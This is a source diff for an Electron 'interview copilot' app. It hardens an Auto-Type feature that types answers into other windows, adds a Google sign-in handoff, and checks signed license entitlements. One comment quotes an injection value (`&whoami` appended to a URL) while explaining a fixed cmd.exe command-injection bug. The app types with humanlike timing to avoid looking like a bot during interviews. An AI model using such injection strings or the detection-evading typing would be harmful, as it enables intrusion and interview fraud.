@@ -42,6 +42,10 @@ const autoTypePlanLog = require('./autoTypePlanLog.cjs');
 // P5d Part 1: target-coverage check — catches under-planned/under-typed
 // solutions that per-op verify is blind to (pure module, unit-tested).
 const { computeCoverageGaps, shouldTriggerRepair } = require('./autoTypeCoverage.cjs');
+// Indentation is the one thing the two whitespace-stripped checks above
+// cannot see, and the one that turns a correct-looking Python answer into
+// a file that will not run. See autoTypeIndent.cjs.
+const { compareIndentation, shouldReportIndent } = require('./autoTypeIndent.cjs');
 
 // ─── Crash reporter — must initialize BEFORE app emits 'ready' ───────
 // Without this, main-process crashes (V8 GC fault, native module SEGV,
@@ -98,9 +102,20 @@ electronLog.transports.file.level = 'info';
 // which won't run if the process is exiting on an uncaught exception.
 // Without this branch, the spawned PowerShell orphans every crash and
 // accumulates in Task Manager.
+//
+// And we let go of every modifier key. An uncaught exception can tear out
+// of the middle of an Auto-Type chord — between the pressKey and the
+// releaseKey — and unlike a spawned process, a held Shift or Ctrl is OS
+// state that outlives us: the user's own next keystrokes become chords in
+// whatever editor has focus. Fire-and-forget with its rejection swallowed,
+// because this handler is synchronous and must not become the source of
+// the next fatal event.
 process.on('uncaughtException', (err) => {
   try { electronLog.error('UNCAUGHT EXCEPTION:', err && err.stack || err); } catch {}
   try { if (typeof killUIABridge === 'function') killUIABridge(); } catch {}
+  try {
+    if (typeof releaseAllModifiers === 'function') releaseAllModifiers().catch(() => {});
+  } catch {}
 });
 process.on('unhandledRejection', (reason) => {
   try { electronLog.error('UNHANDLED REJECTION:', reason && reason.stack || reason); } catch {}
@@ -148,14 +163,10 @@ if (!app.requestSingleInstanceLock()) {
     } else {
       createMainWindow();
     }
-    // If the second-instance trigger was a protocol URL, log it. The
-    // renderer's existing /google/poll path is what actually consumes
-    // the signed-in session — we just needed to bring the window
-    // forward and let the browser tab close on its own.
     try {
       const protoArg = (argv || []).find(a => typeof a === 'string' && a.startsWith('interview-copilot://'));
-      if (protoArg) electronLog.info('[protocol] handoff:', protoArg);
-    } catch { /* logging is best-effort */ }
+      if (protoArg) receiveProtocolUrl(protoArg);
+    } catch { /* handoff is best-effort; the manual code still works */ }
   });
 
   // macOS routes protocol URLs through `open-url` rather than
@@ -165,8 +176,81 @@ if (!app.requestSingleInstanceLock()) {
     if (mainWindow && !mainWindow.isDestroyed()) {
       smoothShow(mainWindow);
     }
-    try { electronLog.info('[protocol] open-url:', url); } catch {}
+    receiveProtocolUrl(url);
   });
+
+  // Cold start: if the app was NOT already running, the OS launches it
+  // with the protocol URL in our own argv — `second-instance` never
+  // fires. Without this branch the very first Google sign-in after an
+  // app restart would find no handoff and fall back to the typed code.
+  //
+  // Deferred to whenReady deliberately: this block runs during module
+  // evaluation, and receiveProtocolUrl closes over `mainWindow` /
+  // `popoutWindow`, whose `let` bindings are still in the temporal dead
+  // zone this early. Calling it inline would throw at boot on precisely
+  // the launch that carries a sign-in.
+  app.whenReady().then(() => {
+    try {
+      const bootProtoArg = (process.argv || []).find(a => typeof a === 'string' && a.startsWith('interview-copilot://'));
+      if (bootProtoArg) receiveProtocolUrl(bootProtoArg);
+    } catch { /* best-effort */ }
+  });
+}
+
+// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+//  GOOGLE SIGN-IN HANDOFF
+//
+//  The browser that completed Google consent navigates to
+//  `interview-copilot://signin-complete?session_id=…&code=…`. The OS
+//  routes that to the app ON THAT MACHINE, which is the whole security
+//  property: /google/poll will not release the session without `code`,
+//  and the code only ever reaches the machine where a human consented.
+//  Someone who picked the session_id and is polling from elsewhere never
+//  sees it. See server/src/routes/auth.js (mintHandoffCode).
+//
+//  Buffered rather than fire-and-forget because the ordering is not ours
+//  to control: on a cold start the URL arrives before any renderer
+//  exists, and even warm the sign-in screen may not have its listener
+//  attached yet. So we push AND hold, and the renderer drains on demand.
+//  Single-slot — a newer sign-in supersedes an abandoned one.
+// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+let pendingGoogleHandoff = null;
+
+function receiveProtocolUrl(rawUrl) {
+  let parsed;
+  try {
+    parsed = new URL(String(rawUrl));
+  } catch {
+    try { electronLog.warn('[protocol] unparseable URL ignored'); } catch {}
+    return;
+  }
+  // `interview-copilot://signin-complete?…` parses with host
+  // 'signin-complete' and an empty path, so match on either shape rather
+  // than assuming one — Chromium's URL parser has moved on this before.
+  const action = (parsed.hostname || parsed.pathname.replace(/^\/+/, '') || '').toLowerCase();
+  if (action !== 'signin-complete') {
+    try { electronLog.info('[protocol] ignored action:', action); } catch {}
+    return;
+  }
+
+  const sessionId = parsed.searchParams.get('session_id');
+  const code = parsed.searchParams.get('code');
+  if (!sessionId || !code) {
+    // A pre-handoff server (or a truncated URL). Nothing to forward; the
+    // browser page shows the typed-code fallback for exactly this case.
+    try { electronLog.warn('[protocol] signin-complete without a handoff code'); } catch {}
+    return;
+  }
+
+  pendingGoogleHandoff = { sessionId, code, receivedAt: Date.now() };
+  // Never log the code itself — it is a bearer credential for a session.
+  try { electronLog.info('[protocol] google handoff received for session', sessionId.slice(0, 8) + '…'); } catch {}
+
+  for (const win of [mainWindow, popoutWindow]) {
+    if (win && !win.isDestroyed()) {
+      try { win.webContents.send('auth:google-handoff', { sessionId, code }); } catch {}
+    }
+  }
 }
 
 let mainWindow = null;
@@ -617,6 +701,44 @@ const isDev = !app.isPackaged;
 // Production builds (`!isDev`) never auto-detect — always api.minicaai.com.
 let API_BASE = process.env.MINICAAI_API_BASE || 'https://api.minicaai.com';
 
+// ── THE MAIN PROCESS IS A CLIENT TOO ──
+//
+// The renderer stamps X-App-Version on every /api/v1/ call (see the block
+// at the top of index.tsx). This process does NOT go through that: it calls
+// the API directly with Node's global fetch — /license/entitlements and the
+// three /ai/autotype-* routes — and Node's fetch is undici, which never
+// touches Electron's session, so a webRequest handler would not see it
+// either. Two independent HTTP surfaces, so two interceptions.
+//
+// None of those routes is version-gated today (autotype is requireTier
+// ULTRA_ONLY, no session gate, no cover), so strictly this changes nothing
+// right now. It is here so that when someone later gates an autotype route,
+// the main process does not silently present as an ancient client and get
+// quietly excluded from a protocol it fully supports — a bug that would
+// look like "auto-type stopped working for no reason".
+//
+// Same shape as the renderer patch: path-scoped, never overwrites, never
+// throws, falls through to the original on anything unexpected.
+(() => {
+  try {
+    const original = globalThis.fetch;
+    if (typeof original !== 'function') return;
+    globalThis.fetch = function patchedFetch(input, init) {
+      try {
+        const url =
+          typeof input === 'string' ? input :
+          (input && typeof input.href === 'string') ? input.href : null;
+        if (url && url.includes('/api/v1/')) {
+          const headers = new Headers((init && init.headers) || undefined);
+          if (!headers.has('X-App-Version')) headers.set('X-App-Version', app.getVersion());
+          return original.call(this, input, { ...(init || {}), headers });
+        }
+      } catch { /* fall through untouched */ }
+      return original.call(this, input, init);
+    };
+  } catch { /* an unstamped request is fine; a broken one is not */ }
+})();
+
 // Probe a candidate local API base; resolves true if it answers a cheap
 // GET within the timeout. Used only in dev, only when MINICAAI_API_BASE
 // is unset.
@@ -810,6 +932,24 @@ function createMainWindow() {
     mainWindow.loadURL('http://localhost:3005');
   } else {
     mainWindow.loadFile(path.join(__dirname, '../dist/index.html'));
+  }
+
+  // ── Keep the Auto-Type entitlement claim warm ──
+  // Started here because this is the first moment the app has both a
+  // renderer to read the signed-in token from and a network it is allowed
+  // to use. Fire-and-forget by construction: the refresher waits 20s, skips
+  // itself entirely while a session is live, and swallows every failure —
+  // nothing in it can delay or break startup. It is idempotent, so the
+  // tray-restore / macOS-'activate' paths that call createMainWindow again
+  // do not stack a second timer. See autoTypeStartEntitlementRefresh.
+  //
+  // Wrapped because this call sits ~2,500 lines ABOVE the const declarations
+  // it depends on. That is fine today — every createMainWindow() call site is
+  // inside a callback, so the module has finished evaluating — but a future
+  // call during module evaluation would hit the temporal dead zone, and an
+  // entitlement refresher must never be the reason a window fails to open.
+  try { autoTypeStartEntitlementRefresh(); } catch (e) {
+    console.warn('[auto-type] entitlement refresher failed to start:', e && e.message);
   }
 
   mainWindow.on('closed', () => {
@@ -1062,6 +1202,24 @@ function createPopoutWindow(options = {}) {
 //  IPC HANDLERS
 // ───────────────────────────────────────────────
 
+// Drain the buffered Google sign-in handoff (see receiveProtocolUrl).
+// The renderer calls this when it opens the sign-in screen and again
+// each poll tick, which covers the cold-start case where the protocol
+// URL arrived before any window existed to receive the broadcast.
+//
+// Read-once: handing the same code out twice serves nothing (the server
+// burns it on first redemption) and holding it lets a stale handoff
+// interfere with the next sign-in attempt.
+ipcMain.handle('auth:consume-google-handoff', () => {
+  const handoff = pendingGoogleHandoff;
+  pendingGoogleHandoff = null;
+  // 5 minutes matches the server's pending-session TTL — anything older
+  // is already dead server-side, so returning it would only produce a
+  // confusing "invalid code" instead of a clean fall-through.
+  if (!handoff || Date.now() - handoff.receivedAt > 5 * 60 * 1000) return null;
+  return { sessionId: handoff.sessionId, code: handoff.code };
+});
+
 // Desktop capturer — renderer can't access this directly in Electron 17+
 ipcMain.handle('get-desktop-sources', async () => {
   const sources = await desktopCapturer.getSources({
@@ -1083,9 +1241,11 @@ ipcMain.handle('get-desktop-sources', async () => {
 // staring at a forever-spinner during Google sign-in. This handler:
 //   1. Tries shell.openExternal first (the standard path)
 //   2. On failure, falls back to child_process spawn — on Windows that's
-//      `cmd /c start "" "URL"` which uses a different ShellExecute code
-//      path; if Win32 ShellExecuteEx is broken, this still often works
-//      because cmd's `start` resolves the protocol handler differently.
+//      `rundll32 url.dll,FileProtocolHandler <URL>`, which reaches the
+//      shell's protocol table down a different code path than Win32
+//      ShellExecuteEx; if ShellExecuteEx is broken, this still often
+//      works. It used to be `cmd /c start "" "URL"` — see the win32
+//      branch for why that had to go.
 //      On macOS we use `open <url>`, on Linux `xdg-open <url>`.
 //   3. Returns { ok, method, error, attempts } so the renderer can show
 //      the user what was tried and why it failed.
@@ -1130,11 +1290,42 @@ ipcMain.handle('open-external-robust', async (_event, url) => {
       let child;
       try {
         if (platform === 'win32') {
-          // The empty `""` is the start-command's title argument — without
-          // it, start would interpret a quoted URL as the title and
-          // silently do nothing. windowsHide:true keeps a cmd window from
-          // briefly flashing into view.
-          child = spawn('cmd.exe', ['/s', '/c', 'start', '""', url], {
+          // NOT `cmd.exe /s /c start "" <url>` any more, and it can never
+          // come back. Node hands argv to CreateProcess through libuv's
+          // quote_cmd_arg, which only quotes an argument containing a
+          // space, a tab or a quote — so an `&` inside the URL arrives at
+          // cmd RAW and cmd reads it as a command separator. `/s` turns off
+          // the quote-preserving rule on top of that. A URL of the shape
+          // `https://host/a&whoami` therefore truncated at the `&` and cmd
+          // EXECUTED the tail; reproduced by swapping `start` for `echo` —
+          // it printed the short URL and then printed machine\user. Neither
+          // guard above catches it: `new URL()` is perfectly happy with `&`
+          // in a path, and the protocol allowlist only looks at the scheme.
+          // (The lore for the old form, for anyone tempted: the empty `""`
+          // was start's title argument — without it start read the quoted
+          // URL as a window title and silently did nothing.)
+          //
+          // rundll32 takes the URL as a plain argv entry. There is no shell
+          // in the path, so there is no separator to inject and nothing to
+          // truncate, and url.dll,FileProtocolHandler goes through the same
+          // ShellExecute protocol table — it opens http/https AND mailto:,
+          // which matters because mailto: is in the allowlist above and is
+          // the case most likely to reach this fallback (a machine with no
+          // mail client registered fails method 1 every time).
+          //
+          // We pass parsed.href, not the raw renderer string: normalized and
+          // percent-encoded, so what actually launches is what we validated.
+          //
+          // Resolve the binary out of %SystemRoot%\System32 instead of
+          // trusting PATH — a PATH that has lost its System32 entry is a
+          // real Windows state, and it would turn this fallback into a
+          // pointless ENOENT. windowsHide:true keeps any console window
+          // from flashing into view.
+          const sysRoot = process.env.SystemRoot || process.env.windir;
+          const rundll32Exe = sysRoot
+            ? path.join(sysRoot, 'System32', 'rundll32.exe')
+            : 'rundll32.exe';
+          child = spawn(rundll32Exe, ['url.dll,FileProtocolHandler', parsed.href], {
             detached: true,
             stdio: 'ignore',
             windowsHide: true,
@@ -1242,20 +1433,36 @@ ipcMain.on('update-prompt-decision', (_event, payload) => {
 // Resize pop-out — keeps window on-screen and animates
 ipcMain.on('resize-popout', (_event, { width, height }) => {
   if (popoutWindow && !popoutWindow.isDestroyed()) {
-    const { width: screenW, height: screenH } = screen.getPrimaryDisplay().workAreaSize;
+    // ── Clamp against the display the popout is ACTUALLY on ──
+    // This read getPrimaryDisplay().workAreaSize, which returns a bare
+    // {width,height} with no origin — then compared the popout's ABSOLUTE
+    // x against it. createPopoutWindow places the popout on the display
+    // nearest the cursor (getDisplayNearestPoint above), so on any
+    // multi-monitor setup — a laptop plus an external monitor, which is
+    // the normal interview desk — those two disagree.
+    //
+    // What the user saw: popout open on the second monitor at x=2000,
+    // press the S/M/L size button, and `2000 + 450 > 1920` fires the
+    // "push back on-screen" branch, teleporting the window onto the
+    // primary display mid-interview. A monitor to the LEFT of primary
+    // (negative x) got yanked the same way by the `newX < 0` branch.
+    //
+    // workArea (not workAreaSize) carries x/y, so the comparisons are
+    // now in the same coordinate space as the window's own bounds.
+    const display = screen.getDisplayMatching(popoutWindow.getBounds());
+    const wa = display.workArea; // { x, y, width, height } — absolute
     const [currentX, currentY] = popoutWindow.getPosition();
-    
-    // Calculate new position so window doesn't go off-screen
-    const newW = Math.min(width, screenW - 20);
-    const newH = Math.min(height, screenH - 20);
+
+    const newW = Math.min(width, wa.width - 20);
+    const newH = Math.min(height, wa.height - 20);
     let newX = currentX;
     let newY = currentY;
 
-    // Push back on-screen if needed
-    if (newX + newW > screenW) newX = screenW - newW - 10;
-    if (newY + newH > screenH) newY = screenH - newH - 10;
-    if (newX < 0) newX = 10;
-    if (newY < 0) newY = 10;
+    // Push back on-screen if needed — within THIS display's work area.
+    if (newX + newW > wa.x + wa.width) newX = wa.x + wa.width - newW - 10;
+    if (newY + newH > wa.y + wa.height) newY = wa.y + wa.height - newH - 10;
+    if (newX < wa.x) newX = wa.x + 10;
+    if (newY < wa.y) newY = wa.y + 10;
 
     popoutWindow.setBounds({ x: newX, y: newY, width: newW, height: newH }, true);
     // Re-enforce after resize
@@ -2189,15 +2396,80 @@ function autoTypeSampleDwell(ch) {
   return Math.max(30, Math.min(180, Math.round(d)));
 }
 
+// ── Hold a key, and ALWAYS let go of it ──
+// pressKey and releaseKey are two separate OS events with our own code in
+// between, so anything that throws in the middle leaves the key PHYSICALLY
+// DOWN — the OS has no idea we gave up. And these calls do throw in the
+// field: see the note further down about libnut's "Invalid key flag" on
+// some Windows builds, and a focus change mid-chord does it too. With
+// Shift or Ctrl stuck down, the rest of the answer types as chords (Ctrl+A,
+// Ctrl+S, Ctrl+W) or as capitals, and — the part that really hurts — the
+// modifier stays down after the run ends, so the USER's own keystrokes are
+// chords too, mid-interview, in someone else's editor.
+//
+// So every hold in this file goes through here and the release lives in a
+// finally. The press is inside the try as well: if pressKey itself half-
+// fails we'd rather emit a redundant keyup (a no-op at OS level for a key
+// that isn't down) than gamble on it. The release is swallowed so a failing
+// release can never mask the original error — the caller still sees the
+// real throw, and every existing catch-and-continue behaves as before.
+//
+// Timing is the caller's business: whatever fn awaits IS the dwell, so the
+// deliberate distinction between 0ms and a sampled dwell survives intact.
+async function withHeldKey(keyboard, key, fn) {
+  try {
+    await keyboard.pressKey(key);
+    return await fn();
+  } finally {
+    try { await keyboard.releaseKey(key); } catch (_) {}
+  }
+}
+
+// ── The belt to withHeldKey's braces ──
+// The per-hold finally covers the normal unwind. A hard fault — an uncaught
+// exception tearing through the middle of a chord — can still get past it,
+// and that state OUTLIVES the run. So we sweep every modifier at the end of
+// every Auto-Type run and from the uncaughtException net.
+//
+// Only ever uses the already-memoized nut handle. It must NEVER call
+// loadNut(): both callers are last-resort paths, and pulling a native .node
+// in from an exception handler is exactly how a bad moment becomes a worse
+// one. If Auto-Type never ran, nothing is held and there is nothing to do.
+//
+// Every release is individually swallowed, and unknown key names are skipped
+// — nut-js builds differ on which Right*/Super keys exist, and one missing
+// enum entry must not stop the sweep from reaching the rest. Being async,
+// nothing in here can throw synchronously at a caller either; the worst case
+// is a rejected promise, and both call sites .catch() it.
+//
+// The name list is local on purpose: a module-scope const would sit in its
+// temporal dead zone if an uncaughtException fired while this file was still
+// evaluating, and this is the one path that has to survive that.
+async function releaseAllModifiers() {
+  const nut = _nut;
+  if (!nut || !nut.keyboard || !nut.Key) return;
+  const names = [
+    'LeftShift', 'RightShift',
+    'LeftControl', 'RightControl',
+    'LeftAlt', 'RightAlt',
+    'LeftSuper', 'RightSuper',
+  ];
+  for (const name of names) {
+    const k = nut.Key[name];
+    if (k === undefined || k === null) continue;
+    try { await nut.keyboard.releaseKey(k); } catch (_) { /* best effort */ }
+  }
+}
+
 // Press a single keystroke with sampled dwell. Used for one-off keys like
 // Backspace, Enter, Tab, arrows, etc — anywhere we'd previously do
 // `pressKey(K); releaseKey(K);` back-to-back (0ms dwell — the bot fingerprint).
 async function autoTypePressWithDwell(keyboard, key) {
   const d = autoTypeLogNormal(85, 0.30);
   const dwell = Math.max(30, Math.min(180, Math.round(d)));
-  await keyboard.pressKey(key);
-  await autoTypeSleep(dwell);
-  await keyboard.releaseKey(key);
+  await withHeldKey(keyboard, key, async () => {
+    await autoTypeSleep(dwell);
+  });
 }
 
 // Type a single CHARACTER (letter/digit/punctuation) with real dwell time.
@@ -2219,17 +2491,21 @@ async function typeCharHumanly(keyboard, Key, ch) {
     if (mapping.shift) {
       // Press Shift, brief settle (real Shift hold overlaps key press),
       // then press the key with dwell, release key, release Shift.
-      await keyboard.pressKey(Key.LeftShift);
-      await autoTypeSleep(12 + Math.random() * 18);
-      await keyboard.pressKey(keyObj);
-      await autoTypeSleep(dwell);
-      await keyboard.releaseKey(keyObj);
-      await autoTypeSleep(6 + Math.random() * 14);
-      await keyboard.releaseKey(Key.LeftShift);
+      // Both holds go through withHeldKey: the inner finally runs before
+      // the outer one, and BOTH run before the catch below — which matters
+      // enormously here, because that catch calls keyboard.type(ch) and it
+      // used to do so with Shift still held.
+      await withHeldKey(keyboard, Key.LeftShift, async () => {
+        await autoTypeSleep(12 + Math.random() * 18);
+        await withHeldKey(keyboard, keyObj, async () => {
+          await autoTypeSleep(dwell);
+        });
+        await autoTypeSleep(6 + Math.random() * 14);
+      });
     } else {
-      await keyboard.pressKey(keyObj);
-      await autoTypeSleep(dwell);
-      await keyboard.releaseKey(keyObj);
+      await withHeldKey(keyboard, keyObj, async () => {
+        await autoTypeSleep(dwell);
+      });
     }
   } catch (e) {
     console.warn('[auto-type] typeCharHumanly manual press failed for', JSON.stringify(ch), ':', e && e.message);
@@ -2697,12 +2973,32 @@ let autoTypeAbortReason = null;
 // Populated when SID fires; renderer pulls it into the multi-line toast.
 let autoTypeAbortDiagnostic = null;
 
+// Run id of the in-flight auto-type, so the broadcast chokepoint below can
+// persist verify outcomes without every branch having to remember to.
+let autoTypeCurrentRunId = null;
+
 // Broadcast progress so the clicked CodeBlock can update its button label.
 // P8-1: tag every broadcast with the owning blockId so non-owners ignore it.
 function autoTypeBroadcast(data) {
   const tagged = (data && typeof data === 'object' && _atCurrentBlockId)
     ? { ...data, blockId: _atCurrentBlockId }
     : data;
+  // Persist the verify outcome. autoTypePlanLog documents a `verify` field
+  // but nothing wrote it, so every recorded run showed a before and an
+  // after with no verdict attached. Recording HERE rather than in each of
+  // the eight verify branches means a new branch can't silently skip it.
+  if (autoTypeCurrentRunId && data && (data.phase === 'verify-ok' || data.phase === 'verify-mismatch')) {
+    try {
+      autoTypePlanLog.record(autoTypeCurrentRunId, {
+        verify: {
+          ok: data.phase === 'verify-ok',
+          reason: data.reason || null,
+          ...(data.repairs !== undefined ? { repairs: data.repairs } : {}),
+          ...(data.missing !== undefined ? { missing: data.missing } : {}),
+        },
+      });
+    } catch (_) { /* logging must never break a run */ }
+  }
   BrowserWindow.getAllWindows().forEach(win => {
     if (!win.isDestroyed()) win.webContents.send('auto-type:status', tagged);
   });
@@ -2735,7 +3031,766 @@ ipcMain.on('auto-type:abort', () => {
   }
 });
 
-ipcMain.handle('auto-type:send', async (_event, payload) => {
+// ───────────────────────────────────────────────
+//  Auto-Type hardening — who may ask, how much, and whether they paid
+//
+//  Everything below exists because 'auto-type:send' is not really an IPC
+//  message, it is an OS-wide keystroke-injection primitive with a preload
+//  allowlist entry in front of it. It types into whatever window the OS
+//  has focused — a terminal, an SSH session, a password manager — after
+//  hiding our own window so the user is looking at the target. Three
+//  things were missing: nobody checked WHO asked, nobody checked HOW MUCH
+//  they asked for, and the "this is an Ultra feature" gate lived entirely
+//  in localStorage, where a text editor is a valid unlock tool.
+// ───────────────────────────────────────────────
+
+// A generous but finite ceiling on payload.code. A 500-line source file is
+// roughly 15 KB, so 100 KB is far past any real interview answer — the
+// point is only that the number exists. An unbounded string here is an
+// unbounded keystroke stream, and the user cannot type faster than it.
+const AT_MAX_CODE_BYTES = 100 * 1024;
+
+// How long a server-proven entitlement stays good with no further contact.
+// Interviews happen on hotel wifi and on monitored corporate networks where
+// Local-Only mode suppresses outbound calls on purpose, so "must be online
+// every time" would break the feature for the people who paid for it. Seven
+// days is the compromise: one online run buys a week of offline runs.
+const AT_ENTITLEMENT_GRACE_MS = 7 * 24 * 60 * 60 * 1000;
+// The probe is fired in parallel with the 3s countdown, so anything under
+// ~3s is invisible to the user. Past that we stop waiting and fall back to
+// the cached grant (or refuse, if there isn't one).
+const AT_ENTITLEMENT_PROBE_TIMEOUT_MS = 6000;
+
+// ── Who may ask ──
+// The invoke must come from the TOP frame of a window WE own. Two separate
+// questions, both of which have to be yes:
+//   1. is the WebContents one of ours (main window or popout)? — this is
+//      what stops any other WebContents we might open later (an OAuth
+//      window, a docs viewer, a future embedded browser) from reaching the
+//      keyboard just because it happens to share a preload;
+//   2. is the sending frame the top frame? — a subframe is embedded content
+//      we did not author (an iframe, an ad, an embedded doc), and embedded
+//      content must never be able to type into the user's terminal.
+// senderFrame can legitimately be null (the frame navigated or died between
+// the send and our handler), and touching a destroyed WebFrameMain throws —
+// both cases resolve to "not trusted", which is the safe direction.
+function autoTypeSenderIsTrusted(event) {
+  try {
+    const sender = event && event.sender;
+    if (!sender || sender.isDestroyed()) return false;
+    const ownsSender =
+      (mainWindow && !mainWindow.isDestroyed() && sender === mainWindow.webContents) ||
+      (popoutWindow && !popoutWindow.isDestroyed() && sender === popoutWindow.webContents);
+    if (!ownsSender) return false;
+    const frame = event.senderFrame;
+    if (!frame) return false;
+    // `parent` is null for a top-level frame. `top` is the belt to that
+    // suspenders — it exists on WebFrameMain in this Electron line, but we
+    // only assert on it when it's actually there so a future API shift
+    // degrades to the parent check rather than to "deny everything".
+    if (frame.parent) return false;
+    if (frame.top && frame.top !== frame) return false;
+    return true;
+  } catch (_) {
+    // Destroyed frame, revoked object, anything at all — deny.
+    return false;
+  }
+}
+
+// ── Did they pay? ──
+// The renderer is no longer believed about tier. gates.autoType comes from
+// JSON.parse(localStorage['minicaai_license']) and user.is_admin from the
+// same blob flips the effective tier to 'ultra' outright, so the client-side
+// gate is decoration. The ONE real gate in the system is server-side:
+// /api/v1/ai/autotype-plan is mounted behind requireTier('ultra'). We reuse
+// it as an entitlement probe rather than inventing a new endpoint — and we
+// POST a body with NO `code` field on purpose, so the tier middleware runs
+// (that is the entire thing we want) and the route itself bails at its own
+// `code is required` 400 before spending a Haiku call. What we learn:
+//
+//   401 / 402 / 403 → the server said NO. Abort the run, type nothing.
+//                     This is the line that matters: main.cjs used to treat
+//                     ANY non-OK planner response as "fine, use the
+//                     deterministic fallback" and typed anyway, so a 403
+//                     from the only real gate in the product was a
+//                     no-op.
+//   2xx / 400 / 422 → the tier middleware PASSED (a 400 can only come from
+//                     the handler, which runs after it). Entitlement proven.
+//   404 / 5xx / net → we learned nothing. NOT a denial — an old server, a
+//                     cold start, or airport wifi must not look like fraud.
+//
+// A proven entitlement is cached under userData. We never cache a denial as
+// an allow, and an explicit tier denial DELETES the cached allow so a grace
+// window can't outlive a cancelled subscription.
+function autoTypeEntitlementFile() {
+  return path.join(app.getPath('userData'), 'autotype-entitlement.json');
+}
+
+// Cache key: the user id out of the JWT when we can read one, otherwise a
+// fingerprint of the token itself. The JWT is NOT verified here and does not
+// need to be — this is a lookup key, not a credential. A forged key can only
+// ever find an entry that a real server grant wrote for that same id on this
+// same machine. Preferring the id over the raw token means the cache
+// survives token rotation (/license/validate rotates tokens every ~30 min),
+// which is exactly the user who is entitled and about to go offline.
+function autoTypeIdentityKey(authToken) {
+  if (!authToken) return null;
+  try {
+    const seg = String(authToken).split('.')[1];
+    if (seg) {
+      const json = JSON.parse(Buffer.from(seg.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8'));
+      const id = json && (json.id != null ? json.id : (json.sub != null ? json.sub : json.userId));
+      if (id != null && String(id).length) return `u:${String(id)}`;
+    }
+  } catch (_) { /* not a JWT — fall through to the fingerprint */ }
+  try {
+    return 't:' + require('crypto').createHash('sha256').update(String(authToken)).digest('hex').slice(0, 16);
+  } catch (_) {
+    return null;
+  }
+}
+
+function autoTypeReadEntitlementCache() {
+  try {
+    const raw = fs.readFileSync(autoTypeEntitlementFile(), 'utf8');
+    const parsed = JSON.parse(raw);
+    if (parsed && typeof parsed === 'object' && parsed.entries && typeof parsed.entries === 'object') return parsed;
+  } catch (_) { /* missing or corrupt — treated as "never verified" */ }
+  return { v: 1, entries: {} };
+}
+
+// Returns { ageMs } for a still-valid grant, or null. A null key means we
+// have no token to key on (signed out, or an old renderer): in that case any
+// fresh grant on this machine counts. That is deliberate — the grant proves
+// "this installation was verified Ultra recently", which is the property we
+// actually care about, and it keeps a user whose token vanished from being
+// locked out mid-interview.
+function autoTypeCachedEntitlement(key) {
+  const cache = autoTypeReadEntitlementCache();
+  const now = Date.now();
+  const fresh = (e) => e && e.ok === true && typeof e.at === 'number' && (now - e.at) >= 0 && (now - e.at) < AT_ENTITLEMENT_GRACE_MS;
+  if (key) {
+    const entry = cache.entries[key];
+    return fresh(entry) ? { ageMs: now - entry.at, key } : null;
+  }
+  for (const [k, entry] of Object.entries(cache.entries)) {
+    if (fresh(entry)) return { ageMs: now - entry.at, key: k };
+  }
+  return null;
+}
+
+function autoTypeRememberEntitlement(key) {
+  if (!key) return;
+  try {
+    const cache = autoTypeReadEntitlementCache();
+    cache.entries[key] = { ok: true, at: Date.now() };
+    // Bound the file. Nobody signs into more than a handful of accounts on
+    // one machine, and an unbounded map here would be a slow disk leak.
+    const keys = Object.keys(cache.entries);
+    if (keys.length > 8) {
+      keys.sort((a, b) => (cache.entries[a].at || 0) - (cache.entries[b].at || 0));
+      for (const k of keys.slice(0, keys.length - 8)) delete cache.entries[k];
+    }
+    fs.writeFileSync(autoTypeEntitlementFile(), JSON.stringify(cache), 'utf8');
+  } catch (e) {
+    // Best-effort. A machine that can't write here just re-verifies online
+    // every run, which is inconvenient, never unsafe.
+    console.warn('[auto-type] could not persist entitlement:', e && e.message);
+  }
+}
+
+function autoTypeForgetEntitlement(key) {
+  if (!key) return;
+  try {
+    const cache = autoTypeReadEntitlementCache();
+    if (cache.entries[key]) {
+      delete cache.entries[key];
+      fs.writeFileSync(autoTypeEntitlementFile(), JSON.stringify(cache), 'utf8');
+    }
+  } catch (_) { /* best-effort */ }
+}
+
+// ───────────────────────────────────────────────
+//  The SIGNED claim — a grant we can verify but cannot mint
+//
+//  Everything above this line is honest bookkeeping, not proof. The cached
+//  grant is {ok:true, at:<ms>} in a JSON file under the user's own userData
+//  directory, which means "have I paid?" was answerable with a text editor
+//  and the seven-day grace window was a seven-day hole. The server now hands
+//  back the same verdict as an Ed25519-signed claim from
+//  GET /api/v1/license/entitlements, and this is the half that checks it.
+//
+//  Why ASYMMETRIC: the desktop app must be able to VERIFY a claim without
+//  being able to MINT one. An HMAC needs the same secret on both ends, and a
+//  secret compiled into a binary that runs on the attacker's machine is not
+//  a secret — it is one `strings` away from being an Ultra key generator.
+//  With Ed25519 the private half never leaves the server env and the worst
+//  anyone can do with the constant below is check somebody else's claim,
+//  which is why it is safe to ship in plain sight.
+// ───────────────────────────────────────────────
+const AT_ENTITLEMENT_PUBLIC_KEY_B64 = 'MCowBQYDK2VwAyEA1I54O1cf6oxYxxuRVrFORRb0NZzchmPtodRI4Llqc/Y=';
+
+// undefined = not parsed yet, null = parsed and unusable. Lazy + memoized
+// for the same reason the server parses its half lazily: a bad constant must
+// degrade to "no signed claims, use the probe", never to a throw on the
+// module's load path.
+let _atClaimPublicKey;
+function autoTypeClaimPublicKey() {
+  if (_atClaimPublicKey !== undefined) return _atClaimPublicKey;
+  try {
+    const key = require('crypto').createPublicKey({
+      key: Buffer.from(AT_ENTITLEMENT_PUBLIC_KEY_B64, 'base64'),
+      format: 'der',
+      type: 'spki',
+    });
+    // Buffer.from(..., 'base64') silently drops anything outside the
+    // alphabet, so a mangled paste can still yield a DER blob that parses
+    // into SOMETHING. Insist on the curve we are actually verifying against.
+    _atClaimPublicKey = key.asymmetricKeyType === 'ed25519' ? key : null;
+  } catch (_) {
+    _atClaimPublicKey = null;
+  }
+  return _atClaimPublicKey;
+}
+
+// The verification. Returns the decoded claim object when the envelope is
+// genuine, unexpired and belongs to `expectedSub`; otherwise null — which
+// every caller reads as "we hold no signed claim", NOT as a denial. Never
+// throws: this parses a file sitting on the user's own disk, so garbage in
+// has to mean null out rather than an exception on the keystroke path.
+//
+// WHAT BYTES ARE CHECKED — the single most load-bearing detail in this file.
+// The signature covers the ASCII characters of the base64url payload STRING
+// exactly as transmitted, not the decoded object and not a re-encoding of
+// it. JSON.stringify has no canonical key order across versions, languages,
+// or a well-meaning refactor that reorders a literal, so a verifier that
+// parses and re-serializes before checking is a verifier that fails at
